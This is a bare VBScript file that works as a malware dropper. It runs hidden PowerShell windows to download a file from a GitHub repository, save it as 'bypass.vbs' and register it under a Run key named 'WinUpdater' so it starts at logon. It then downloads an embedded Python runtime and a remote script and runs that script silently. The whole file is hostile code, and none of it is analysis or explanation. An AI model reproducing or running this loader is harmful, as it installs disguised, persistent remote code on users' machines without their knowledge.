Set objShell = CreateObject("WScript.Shell")


objShell.Run "powershell.exe -WindowStyle hidden -Command ""New-Item -ItemType Directory -Force -Path C:\Downloads""", 0, True
WScript.Sleep 1000


objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -Uri https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/start-up.bat -OutFile C:\Downloads\bypass.vbs""", 0, True


objShell.Run "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v WinUpdater /t REG_SZ /d ""C:\Downloads\bypass.vbs""", 0, True


objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://mienx.com/python-3.10.0-embed-amd64.zip -OutFile C:\Users\Public\Document.zip""", 0, True


objShell.Run "powershell.exe -WindowStyle hidden -Command ""Expand-Archive C:\Users\Public\Document.zip -DestinationPath C:\Users\Public\Document""", 0, True


objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/sim.py -OutFile C:\Users\Public\Document\script.py""", 0, True


objShell.Run "powershell.exe -WindowStyle hidden -Command ""C:\Users\Public\Document\python C:\Users\Public\Document\script.py""", 0, True


WScript.Quit
